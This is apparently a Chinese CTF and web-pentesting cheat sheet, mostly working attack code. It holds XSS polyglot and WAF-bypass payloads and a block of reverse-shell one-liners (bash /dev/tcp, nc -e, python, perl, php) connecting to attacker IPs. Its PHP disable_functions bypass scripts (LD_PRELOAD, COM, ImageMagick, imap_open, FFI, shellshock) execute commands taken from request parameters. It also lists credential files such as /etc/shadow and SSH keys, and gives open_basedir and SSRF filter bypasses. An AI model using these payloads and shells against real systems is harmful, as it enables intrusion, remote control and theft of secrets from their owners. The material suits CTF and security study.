使用通用 XSS 攻击字串手动检测 XSS 漏洞：
```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```
能够检测到存在于 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等多种上下文中的 XSS 漏洞，也能检测 eval()、setTimeout()、setInterval()、Function()、innerHTML、document.write() 等 DOM 型 XSS 漏洞，并且能绕过一些 XSS 过滤器。

**绕过magic_quotes_gpc：**在magic_quotes_gpc=On的情况下，如果输入的数据有单引号（’）、双引号（”）、反斜线（\）与 NUL（NULL 字符）等字符都会被加上反斜线
使用String.fromCharCode()，把ascii转换为字符串
`alert("xss")  ==> String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41)`

图片标签：`<img src="#" onerror=alert('xss')>`
xssDOM型绕过
`?#default=<script>alert(/xss/)</script>`用#绕过后端过滤

**奇技淫巧：**
```html
%ff<!---><svg/onload=top[/al/.source+/ert/.source]&lpar;)>
<%00EEEE<svg /\/\//ONLoad='a\u006c\u0065\u0072\u0074(1)'/\/\/\>svg>%0APayload
<html \" onmouseover=/*&lt;svg/*/onload=alert(2)//>
<script>window[490837..toString(1<<5)](atob('YWxlcnQoMSk='))</script>
<script>eval('\\u'+'0061'+'lert`_Y000!_`')</script>
<script>throw~delete~typeof~prompt`_Y000!_`</script>
<script>(()=>{return this})().alert`_Y000!_`</script>
<ijavascriptmg+src+ojavascriptnerror=confirm(1)>

<img%20id=%26%23x101;%20src=x%20onerror=%26%23x101;;alert`1`;>
<svg%0Aonauxclick=0;[1].some(confirm)//
/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
<svg/onload='+/"/+/onmouseover=1/+/[/[]/+alert(9527)//'>
```
WAFbypass payload:
```javascript
<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)"/>click
```
xss payload大全：[XSS-Payloads](https://github.com/pgaijin66/XSS-Payloads/blob/master/payload/payload.txt)

参考文章：
[奇技淫巧(全) - XSS payload ](https://mp.weixin.qq.com/s/2psSNI8GATMc8fx8o3Jl8w)
[前端安全系列（一）：如何防止XSS攻击？](https://segmentfault.com/a/1190000016551188)
### 杂知识
>/.bash_history  (泄露历史执行命令)
/.bashrc    (部分环境变量)
/.ssh/id_rsa(.pub) (ssh登录私钥/公钥)
/.viwinfo (vim历史记录)

[经典写配置漏洞与几种变形](https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html)
[[小密圈]经典写配置漏洞与几种变形学习](https://www.smi1e.top/%E5%B0%8F%E5%AF%86%E5%9C%88%E7%BB%8F%E5%85%B8%E5%86%99%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%87%A0%E7%A7%8D%E5%8F%98%E5%BD%A2%E5%AD%A6%E4%B9%A0/)
[PHP配置文件经典漏洞 ](https://www.cnblogs.com/wh4am1/p/6607837.html)

查看源代码：ctrl+u，F12，Ctrl+shift+i，右键查看，view-source：
不可显字符 ：%80 – %ff

A rlike B ，表示B是否在A里面即可。而A like B,则表示B是否是A.
[Hive中rlike,like,not like区别与使用详解](https://blog.csdn.net/qq_26442553/article/details/79452221)
__order by :__ asc 顺序排列 ，desc 逆序排列

IP伪造：X-Forwarded-For/Client-IP/X-Real-IP/CDN-Src-IP/X-Remote-IP
从某国家访问，一般修改Accept-Language
从某个页面访问就修改Referer，Origin


#### apache2,nginx重要文件位置
配置文件：
>/usr/local/apache2/conf/httpd.conf
    /usr/local/etc/apache2/httpd.conf
    /usr/local/nginx/conf/nginx.conf
    /etc/apache2/sites-available/000-default.conf
    /etc/apache2/apache2.conf
    /etc/apache2/httpd.conf
    /etc/httpd/conf/httpd.conf
    /etc/nginx/conf.d/default.conf
    /etc/nginx/nginx.conf
    /etc/nginx/sites-enabled/default
    /etc/nginx/sites-enabled/default.conf
    /etc/mysql/my.cnf
    $TOMCAT_HOME/conf/tomcat-users.xml
    $TOMCAT_HOME/conf/server.xml

其他：
>/proc/self/cmdline
/proc/self/fd/[0-9]*
/proc/self/environ
/proc/mounts
/proc/net/arp
/proc/net/tcp
/proc/sched_debug
.htaccess
~/.bash_profile
~/.bash_logout
~/.env
/etc/passwd
/etc/shadow
/etc/hosts
/root/.ssh/id_rsa
/root/.ssh/authorized_keys


![](/bmth_blog/images/pasted-153.png)
[Linux /proc/pid目录下相应文件的信息说明和含义](https://blog.csdn.net/enweitech/article/details/53391567)
[/proc目录的妙用](http://www.rayi.vip/2020/11/01/proc%E7%9B%AE%E5%BD%95%E7%9A%84%E5%A6%99%E7%94%A8/)

日志信息：
>	/usr/local/var/log/nginx/access.log
	/var/log/nginx/access.log
	/var/logdata/nginx/access.log
	/var/log/nginx/error.log
    /var/log/apache2/error.log
    /var/log/httpd/access_log
    /var/log/mail.log



#### 反弹shell
```bash
#Bash
bash -i >& /dev/tcp/attackerip/6666 0>&1

#nc
nc -e /bin/sh attackerip 6666

#python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.1.1.15",6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

#perl
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
perl -e 'use Socket;$i="192.168.31.41";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

#DNS_Shell
https://github.com/ahhh/Reverse_DNS_Shell

#icmp_shell
http://icmpshell.sourceforge.net/

#Linux(index.js)
https://github.com/lukechilds/reverse-shell

#PHP：
php -r '$sock=fsockopen("192.168.31.41",8080);exec("/bin/sh -i <&3 >&3 2>&3");'
https://github.com/pentestmonkey/php-reverse-shell

#JSP：
https://github.com/z3v2cicidi/jsp-reverse-shell

#ASPX： 
https://github.com/borjmz/aspx-reverse-shell
```

可参考文章：
[Linux下反弹shell的种种方式](https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html)
[[投稿]Web渗透中的反弹Shell与端口转发的奇淫技巧](http://www.91ri.org/9367.html)
[Spawning A TTY Shell-逃逸Linux各种Shell来执行命令](https://www.lshack.cn/653/)
[Encrypted Bind and Reverse Shells with Socat (Linux/Windows)](https://erev0s.com/blog/encrypted-bind-and-reverse-shells-socat/)
[Get Reverse-shell via Windows one-liner](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)
[Linux下几种反弹Shell方法的总结与理解](https://www.freebuf.com/articles/system/178150.html)
[Linux 反弹shell方法](https://www.smi1e.top/linux-%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E6%B3%95/)
[常用反弹shell备忘录](http://blkstone.github.io/2017/12/30/reverse-shell/)
[反弹shell原理与实现](https://www.cnblogs.com/iouwenbo/p/11277453.html)
[反弹shell的各种姿势](https://mp.weixin.qq.com/s/uXnPctlOBmciHM4Q-7oquw)
[【技术分享】Linux渗透之反弹Shell命令解析 ](https://www.anquanke.com/post/id/85712)
[反弹shell的N种姿势](https://mp.weixin.qq.com/s/AnvJIRX9hx4g4gg8Er_O4g)
[如何将简单的Shell转换成为完全交互式的TTY](https://www.freebuf.com/news/142195.html)
[【技术分享】linux各种一句话反弹shell总结 ](https://www.anquanke.com/post/id/87017)
### php相关内容
[php7-函数特性分析](http://www.pdsdt.lovepdsdt.com/index.php/2019/10/17/php7-函数特性分析/)
[PHP绕过姿势](https://lazzzaro.github.io/2020/05/18/web-PHP%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/)
[CTF 知识库 ](https://ctf.ieki.xyz/library/)
[phpinfo可以告诉我们什么 ](https://zeroyu.xyz/2018/11/13/what-phpinfo-can-tell-we/)
[CTF/PHP特性汇总](https://www.anquanke.com/post/id/231507)

**命令执行函数：**
system()，passthru()，echo exec()，echo shell_exec()，echo 反引号，

popen() 函数打开进程文件指针。
语法：`popen(command,mode)`

参数	|描述
-----|-----
command	|必需。规定要执行的命令。
mode	|必需。规定连接模式。 可能的值：r: 只读。w: 只写 (打开并清空已有文件或创建一个新文件)

proc_open — 执行一个命令，并且打开用来输入/输出的文件指针。
(PHP 4 >= 4.3.0, PHP 5, PHP 7)
类似 popen() 函数， 但是 proc_open() 提供了更加强大的控制程序执行的能力

scandir：列出指定路径中的文件和目录

>通过fopen读文件内容：
函数：fread()，fgets()，fgetc()，fgetss()，fgetcsv()，gpassthru()

php文件读取小技巧
```php
var_dump(((strrev(stnetnoc_teg_elif)))((strrev(edoced_46esab))(Li8uLi8uLi8uLi8uLi8uLi8uLi9mbGFn)));  //file_get_contents(./../../../../../../flag);
$a=fopen("flag.php","r");while (!feof($a)) {$line = fgetss($a);echo $line;} //php7.3版本后 该函数已不再被使用
$a=fopen("flag.php","r");echo fpassthru($a); 
$a=fopen("flag.php","r");echo fread($a,"1000"); 
$a=fopen("flag.php","r");while (!feof($a)) {$line = fgets($a);echo $line;}
$a=fopen("flag.php","r");while (!feof($a)) {$line = fgetc($a);echo $line;}
$a=fopen("flag.php","r");while (!feof($a)) {$line = fgetcsv($a);print_r($line);}
```
**代码执行**
eval()，assert()，preg_replace()

[PHP代码执行函数总结](https://www.cnblogs.com/xiaozi/p/7834367.html)
[深入研究preg_replace与代码执行](https://xz.aliyun.com/t/2557)

**读取文件函数：**
```php
readfile()，show_source()，highlight_file()，var_dump(file_get_contents())，print_r(file_get_contents())，print_r(file())，copy("flag.php","flag.txt")，rename("flag.php","flag.txt")
```
简单绕过：
`var_dump(scandir(chr(47)))  char(47)是 / 的ascii码，也可以用hex2bin(dechex(47))
var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))`

[php源码分析 require_once 绕过不能重复包含文件的限制 ](https://www.anquanke.com/post/id/213235)
#### create_function()代码注入
`create_function()`函数有两个参数`$args`和`$code`，用于创建一个lambda样式的函数
由于$code可控，底层又没有响应的保护参数，就导致出现了代码注入。见如下例子：
```php
<?php
$myFunc = create_function('$a, $b', 'return($a+$b);}eval($_POST['Y1ng']);//');
```
执行时的myFunc()为：
```php
function myFunc($a, $b){
	return $a+$b;
}
eval($_POST['Y1ng']);//}
```
通过手工闭合`}`使后面的代码`eval()`逃逸出了`myFunc()`得以执行，然后利用注释符`//`注释掉`}`保证了语法正确。


#### 绕过php的disable_functions
>1.攻击后端组件，寻找存在命令注入的、web 应用常用的后端组件，如，ImageMagick 的魔图漏洞、bash 的破壳漏洞
2.寻找未禁用的漏网函数，常见的执行命令的函数有 system()、exec()、shell_exec()、passthru()，偏僻的 popen()、proc_open()、pcntl_exec()
3.mod_cgi 模式，尝试修改 .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制
4.利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果

[PHP 突破 disable_functions 常用姿势以及使用 Fuzz 挖掘含内部系统调用的函数 ](https://www.anquanke.com/post/id/197745)
##### LD_PRELOAD
```php
linux环境
putenv()、mail()可用
https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD
http://192.168.0.107/bypass_disablefunc.php?cmd=pwd&outpath=/tmp/xx&sopath=/var/www/bypass_disablefunc_x64.so
outpath是命令输出位置，sopath指定so文件路径。
或
替换php文件中的mail为error_log("a",1);
```
[disable_function绕过--利用LD_PRELOAD](https://www.cnblogs.com/sijidou/p/10816385.html)
[无需sendmail：巧用LD_PRELOAD突破disable_functions](https://www.freebuf.com/articles/web/192052.html)
[深入浅出LD_PRELOAD & putenv()](https://www.anquanke.com/post/id/175403)

##### php7.0-7.4 bypass
```
直接bypass
https://github.com/mm0r1/exploits
```
##### windows系统组件com绕过
```php
<?php
$command = $_GET['cmd'];
$wsh = new COM('WScript.shell'); // 生成一个COM对象　Shell.Application也能
$exec = $wsh->exec("cmd /c".$command); //调用对象方法来执行命令
$stdout = $exec->StdOut();
$stroutput = $stdout->ReadAll();
echo $stroutput;
?>
```
##### CGI启动方式
```php
phpinfo中搜索server api是cgi或者fastcgi
如果是cgi模式:上传如下htaccess
Options ExecCGI
AddHandler cgi-script .xx
windows平台
#!C:/Windows/System32/cmd.exe /c start calc.exe
1
linux平台
#!/bin/bash
echo -ne "Content-Type: text:html\n\n"
whoami
如果是fast_cgi，上传如下htaccess
Options +ExecCGI
AddHandler fcgid-script .abc
FcgidWrapper "C:/Windows/System32/cmd.exe /c start cmd.exe" .abc
上传任意文件.abc
相对路径
AddHandler fcgid-script .html
FcgidWrapper "../../php/php7.3.4nts/php-cgi.exe" .html
​
AddHandler fcgid-script .xx
FcgidWrapper "../../../WWW/localhost/calc.exe" .xx
```
##### ImageMagick组件绕过
```
imageMagick 版本 v6.9.3-9 或 v7.0.1-0
第一种
```
```php
<?php
echo "Disable Functions: " . ini_get('disable_functions') . "\n";
$command = PHP_SAPI == 'cli' ? $argv[1] : $_GET['cmd'];
if ($command == '') {
$command = 'id';
}
$exploit = <<<EOF
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|$command")'    //核心
pop graphic-context
EOF;
file_put_contents("KKKK.mvg", $exploit);
$thumb = new Imagick();
$thumb->readImage('KKKK.mvg');
$thumb->writeImage('KKKK.png');
$thumb->clear();
$thumb->destroy();
unlink("KKKK.mvg");
unlink("KKKK.png");
?>
```
```
第二种
```
```c
#include <stdlib.h>
#include <string.h>
void payload() {
const char* cmd = "nc -e /usr/bin/zsh 127.0.0.1 4444";
system(cmd);
}
int fileno() {
if (getenv("LD_PRELOAD") == NULL) { return 0; }
unsetenv("LD_PRELOAD");
payload();
}
```
```
编译
gcc -shared -fPIC imag.c -o imag.so
```
```php
<?php
putenv('LD_PRELOAD=/var/www/html/imag.so');
$img = new Imagick('/tmp/1.ps');
?>
```
##### pcntl_exec
```
开启了pcntl 扩展，并且php 4>=4.2.0 , php5，linux
```
```php
<?php
if(function_exists('pcntl_exec')) {
pcntl_exec("/bin/bash", array("/tmp/test.sh"));
} else {
echo 'pcntl extension is not support!';
}
?>
```
```
test.sh
#!/bin/bash
nc -e /bin/bash 1.1.1.1 8888       #反弹shell
```

##### imap_open函数
```php
<?php
error_reporting(0);
if (!function_exists('imap_open')) {
die("no imap_open function!");
}
$server = "x -oProxyCommand=echo\t" . base64_encode($_GET['cmd'] . ">/tmp/cmd_result") . "|base64\t-d|sh}";
imap_open('{' . $server . ':143/imap}INBOX', '', '');
sleep(5);
echo file_get_contents("/tmp/cmd_result");
?>
```
##### php7.4 FFI绕过
```
php 7.4
ffi.enable=true
```
```php
<?php
$a='nc -e /bin/bash ip 8888';
$ffi = FFI::cdef(
    "int system(char *command);",
    "libc.so.6");
$ffi->system($a);
?>
```
[利用 PHP 中的 FFI 扩展执行命令](https://mp.weixin.qq.com/s/4U1HYCC5MeP5KsqBPQhzoQ)
##### shellshock
```
存在CVE-2014-6271漏洞
PHP 5.*，linux，putenv()、mail()可用
```
```php
<?php
function shellshock($cmd) {
$tmp = tempnam(".","data");
putenv("PHP_LOL=() { x; }; $cmd >$tmp 2>&1");
mail("a@127.0.0.1","","","","-bv");
$output = @file_get_contents($tmp);
@unlink($tmp);
if($output != "") return $output;
else return "No output, or not vuln.";
}
echo shellshock($_REQUEST["cmd"]);
?>
```

[PHP中通过bypass disable functions执行系统命令的几种方式](https://www.freebuf.com/articles/web/169156.html)
[绕过php的disable_functions（上篇）](http://47.98.146.200/index.php/archives/44/)
[Bypass disabled_functions一些思路总结](https://xz.aliyun.com/t/4623#toc-8)
[bypass disable_function总结学习](https://www.cnblogs.com/tr1ple/p/11213732.html)
[PHP 突破 disable_functions 常用姿势以及使用 Fuzz 挖掘含内部系统调用的函数](https://www.anquanke.com/post/id/197745)
[针对宝塔的RASP及其disable_functions的绕过](https://xz.aliyun.com/t/7990)

#### open_basedir绕过
```php
//第一种
a=$a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().' ');};
a=if($b = opendir("glob:///var/www/html/*.php") ) {while ( ($file = readdir($b)) !== false ) {echo "filename:".$file."\n";} closedir($b);}
//第二种
a=ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');system('cat ../../../../../etc/passwd');
a=mkdir("/tmp/crispr");chdir('/tmp/crispr/');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print_r(scandir('.'));
//第三种
//命令执行绕过
//读文件
?a=show_source('/flag');
?a=echo(readfile('/flag'));
?a=print_r(readfile('/flag'));
?a=echo(file_get_contents('/flag'));
?a=print_r(file_get_contents('/flag'));
?cmd=mkdir('bmth');chdir('bmth');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print_r(scandir('.'));var_dump(file_get_contents("/usr/local/etc/php/php.ini"));
```
[php5全版本绕过open_basedir读文件脚本](https://www.leavesongs.com/bypass-open-basedir-readfile.html)
[bypass open_basedir的新方法](https://xz.aliyun.com/t/4720)
[浅谈几种Bypass open_basedir的方法](https://www.cnblogs.com/hookjoy/p/12846164.html)
#### 绕过 filter_var 的 FILTER_VALIDATE_URL 过滤器
```c
http://localhost/index.php?url=http://demo.com@sec-redclub.com
http://localhost/index.php?url=http://demo.com&sec-redclub.com
http://localhost/index.php?url=http://demo.com?sec-redclub.com
http://localhost/index.php?url=http://demo.com/sec-redclub.com
http://localhost/index.php?url=demo://demo.com,sec-redclub.com
http://localhost/index.php?url=demo://demo.com:80;sec-redclub.com:80/
http://localhost/index.php?url=http://demo.com#sec-redclub.com
PS:最后一个payload的#符号，请换成对应的url编码 %23
```
可以用javascript伪协议进行绕过，javascript://

文章：[SSRF技巧之如何绕过filter_var( )](https://www.anquanke.com/post/id/101058)
#### 绕过 parse_url 函数
parse_url用`///`绕过
这里给了一个payload：`http://localhost/index.php?url=demo://%22;ls;%23;sec-redclub.com:80/`
直接用 `cat f1agi3hEre.php` 命令的时候，过不了 filter_var 函数检测，因为包含空格
payload：`http://localhost/index.php?url=demo://%22;cat<f1agi3hEre.php;%23;sec-redclub.com:80/`

[ctf中代码审计以及自己的总结](https://blog.csdn.net/weixin_43999372/article/details/86631794)

#### php审计
[利用PHP的一些特性绕过WAF](https://mochazz.github.io/2019/01/03/%E5%88%A9%E7%94%A8PHP%E7%9A%84%E4%B8%80%E4%BA%9B%E7%89%B9%E6%80%A7%E7%BB%95%E8%BF%87WAF/)
[PHP代码审计归纳](https://www.ddosi.com/b174/)
[PHP代码审计分段讲解](https://github.com/bowu678/php_bugs)
[PHP trick（代码审计关注点）](https://paper.seebug.org/561/)
strpos：数组绕过
ereg正则：%00截断

```php
<?php
session_start(); 
if (isset ($_GET['password'])) {
    if ($_GET['password'] == $_SESSION['password'])
        die ('Flag: '.$flag);
    else
        print '<p>Wrong guess.</p>';
}
```
session在判断时是没有值的，构造第二个if语句左右均为空值。

**intval整数溢出**
php整数上限溢出绕过intval:
>intval 函数最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval('1000000000000') 会返回 2147483647。 64 位系统上，最大带符号的 integer 值是 9223372036854775807。


**浮点数精度忽略**
```php
if ($req["number"] != intval($req["number"]))
```
在小数小于某个值（10^-16）以后，再比较的时候就分不清大小了。 输入number = 1.00000000000000010, 右边变成1.0, 而左与右比较会相等

**inclue用?截断**
```php
<?php
$name=$_GET['name'];  
$filename=$name.'.php';  
include $filename;  
?>
```
当输入的文件名包含URL时，问号截断则会发生，并且这个利用方式不受PHP版本限制，原因是Web服务其会将问号看成一个请求参数。 测试POC： `http://127.0.0.1/test/t1.php?name=http://127.0.0.1/test/secret.txt?` 则会打开secret.txt中的文件内容。本测试用例在PHP5.5.38版本上测试通过。

单引号或双引号都可以用来定义字符串。但只有双引号会调用解析器。
```php
$abc='I love u'; 
echo $abc //结果是:I love u 
echo '$abc' //结果是:$abc 
echo "$abc" //结果是:I love u 

$a="${@phpinfo()}"; //可以解析出来
<?php $a="${@phpinfo()}";?> //@可以为空格，tab，/**/ ，回车，+，-，!，~,\等
```

**可变变量指的是：一个变量的变量名可以动态的设置和使用。一个可变变量获取了一个普通变量的值作为其变量名。**
![](https://img-blog.csdnimg.cn/2020051913015532.png)
这里使用 \$$ 将通过变量a获取到的数据，注册成为一个新的变量(这里是变量hello)。然后会发现变量 \$$a 的输出数据和变量 $hello 的输出数据一致（如上图，输出为 world ）。
![](https://img-blog.csdnimg.cn/2020051919215158.png)
**md5的值与自身弱相等：**
```php
$md5=$_GET['md5'];
   if ($md5==md5($md5))
```
爆破脚本：
```python
import hashlib

for i in range(0,10**33):
    i = str(i)
    # i = i.zfill(33)
    num = '0e' + i
    md5 = hashlib.md5(num.encode()).hexdigest()
    if md5[0:2] == '0e' and md5[2:].isdigit():
        print('success str:{}  md5(str):{}'.format(num, md5))
        break
    else:
        print("trying {}".format(num))
```
得到`0e215962017，md5为0e291242476940776845150308577824`

**同理进行扩展学习：**
```php
import hashlib

for i in range(1200000000,10**33):
    i = str(i)
    num = '0e' + i
    md5 = hashlib.md5(num.encode()).hexdigest()
    md5 = hashlib.md5(md5.encode()).hexdigest()
    # print(md5)
    if md5[0:2] == '0e' and md5[2:].isdigit():
        print('success str:{}  md5(str):{}'.format(num, md5))
        break
    else:
        if int(i) % 1000000 == 0:
         print(i)
```
```php
$md5==md5(md5($md5)):
str:0e1138100474  md5(str):0e779212254407018184727546255414
str:0e1576609003  md5(str):0e783827937870189505146310298941
$md4==hash("md4",$md4):
明文 :0e251288019 md4密文: 0e874956163641961271069404332409
明文 : 0e001233333333333334557778889 md4密文: 0e434041524824285414215559233446
```
**两个变量长度不能超过5，但md5的值又要相同，而且强弱比较也不能相同**
php预定义常量绕过
`M_PI，M_E，M_LN2，NAN，INF`
>`NAN`和`INF`，分别为非数字和无穷大，但是var_dump一下它们的数据类型却是double，那么在md5函数处理它们的时候，是将其直接转换为字符串”NAN”和字符串”INF”使用的，但是它们拥有特殊的性质，它们与任何数据类型（除了true）做强类型或弱类型比较均为false，甚至`NAN===NAN`都是false，但`md5('NaN')===md5('NaN')`为true。
```php
<?php
$a = INF;
$b = (string)$a;
var_dump($a) ;
var_dump($b);
echo md5($a);
echo "\n";
echo md5($b);
```
![](https://img-blog.csdnimg.cn/20200922132818970.png#pic_center)
```php
var_dump(md5('INF'));
//9517fd0bf8faa655990a4dffe358e13e
var_dump(md5(9e999999));//9e999999即INF
//9517fd0bf8faa655990a4dffe358e13e
```

发现还有另一种解法
![](https://img-blog.csdnimg.cn/20200929164042536.png#pic_center)
```php
var_dump(md5(0.01));
//04817efd11c15364a6ec239780038862
var_dump(md5(0.1*0.1));
//04817efd11c15364a6ec239780038862
```

[PHP函数漏洞总结](https://blog.csdn.net/qq_39293438/article/details/108247569)
[ciscn2020复现-web-Easytrick](https://blog.csdn.net/qq_44657899/article/details/108196883)

**假如waf不允许num变量传递字母：**
`http://www.xxx.com/index.php?num = aaaa   //显示非法输入的话`
那么我们可以在num前加个空格：
`http://www.xxx.com/index.php? num = aaaa`
这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。

[利用PHP的字符串解析特性Bypass](https://www.freebuf.com/articles/web/213359.html)

对于传入的非法的 $_GET 数组参数名，PHP会将他们替换成 **下划线**
```python
32: (空格)
43:+
46:.
91:[
95:_
```
当我们使用HPP（HTTP参数污染%0a）传入多个相同参数给服务器时，PHP只会接收到后者的值。（这一特性和中间件有关系）

当中过滤了 # 、 - 号，那么我们就无法进行常规的注释，但是我们可以用 `;%00` 来进行注释
```c
http://localhost/CTF/?user=\&pwd=||1;%00
对应SQL语句为：
select user from users where user='\' and pwd='||1;'
等价于：
select user from users where user='xxxxxxxxxxx'||1#
```
参考：
[红日安全：PHP-Audit-Labs](https://github.com/hongriSec/PHP-Audit-Labs)


(1)仍是int，但是如果`((1).(2)) `（注意需要套一个括号否则出错）就会得到字符串“12”
![](https://img-blog.csdnimg.cn/20200704114651562.png)
之后再通过字符串截取即可得到单字符，PHP中可以使用大括号来完成，也是按照惯例，第一个字符编号是0，第二个是1，以此类推
![](https://img-blog.csdnimg.cn/20200704114822970.png)
师傅文章：[XCTF-RCTF calc题](https://www.gem-love.com/ctf/2373.html)

#### php反序列化
**常见方法：**
```php
__construct()//创建对象时触发
__destruct() //对象被销毁时触发
__call() //在对象上下文中调用不可访问的方法时触发
__callStatic() //在静态上下文中调用不可访问的方法时触发
__get() //用于从不可访问的属性读取数据
__set() //用于将数据写入不可访问的属性
__isset() //在不可访问的属性上调用isset()或empty()触发
__unset() //在不可访问的属性上使用unset()时触发
__invoke() //当脚本尝试将对象调用为函数时触发
```
**比较重要的方法：**
__sleep()：
>serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。

对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。

__wakeup():
>unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。

__toString()
>__toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。

**原生类：**

SLP类中存在能够进行文件处理和迭代的类：

类  | 描述
-------- | -------
DirectoryIterator 	|遍历目录
FilesystemIterator 	|遍历目录
GlobIterator 	|遍历目录，但是不同的点在于它可以通配例如/var/html/www/flag*
SplFileObject 	|读取文件，按行读取，多行需要遍历
finfo/finfo_open() 	|需要两个参数


例题：[安恒月赛DASCTF三月娱乐赛 ](http://www.plasf.cn/articles/dasctf202103.html)

参考文章：
[浅谈php反序列化的参数类型](https://550532788.github.io/2020/08/26/浅谈php反序列化的参数类型/)
[从一道CTF练习题浅谈php原生文件操作类](https://www.anquanke.com/post/id/167140)
[利用 phar 拓展 php 反序列化漏洞攻击面](https://paper.seebug.org/680/)
[四个实例递进php反序列化漏洞理解 ](https://www.anquanke.com/post/id/159206?display=mobile&platform=android)
[Session反序列化利用和SoapClient+crlf组合拳进行SSRF ](https://www.anquanke.com/post/id/202025)
[PHP反序列化由浅入深](https://xz.aliyun.com/t/3674)
[PHP反序列化漏洞例题总结](https://www.codeku.me/archives/3982.html)
[从CTF中学习PHP反序列化的各种利用方式](https://xz.aliyun.com/t/7570#toc-2)
[反序列化之PHP原生类的利用](https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label1_0)
[POP链学习](http://redteam.today/2017/10/01/POP%E9%93%BE%E5%AD%A6%E4%B9%A0/)
#### php伪随机数
```php
<?php
function getSeed()
{
    $chars = 'abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ';
    $max = strlen($chars) - 1;

    $hash_result = 'vEUHaY';
    $arr = [];
    $index = 0;
    for ($i=0; $i< strlen($hash_result); $i++)
    {
        for ($j=0; $j< strlen($chars); $j++)
        {
            if ( $hash_result[$i] === $chars[$j] )
            {
                $arr[$index] = $j;
                $index++;
                break;
            }
        }
    }
    echo "./php_mt_seed ";
    for ($i = 0; $i<count($arr); $i++)
    {
        echo "${arr[$i]} ${arr[$i]} 0 ${max} ";
    }
    echo "\n";
}

function getKey()
{
    function random($length, $chars = '0123456789ABC') {
        $hash = '';
        $max = strlen($chars) - 1;
        for($i = 0; $i < $length; $i++) {
            $hash .= $chars[mt_rand(0, $max)];
        }
        return $hash;
    }
    mt_srand(718225);
    $lock = random(6, 'abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ');
    $key = random(16, '1294567890abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ');
    echo $lock . ' ' . $key;
}
getSeed(); //./php_mt_seed 21 21 0 51 30 30 0 51 46 46 0 51 33 33 0 51 0 0 0 51 50 50 0 51
getKey(); //  vEUHaY nRtqGR8mtd9ZOPyI
```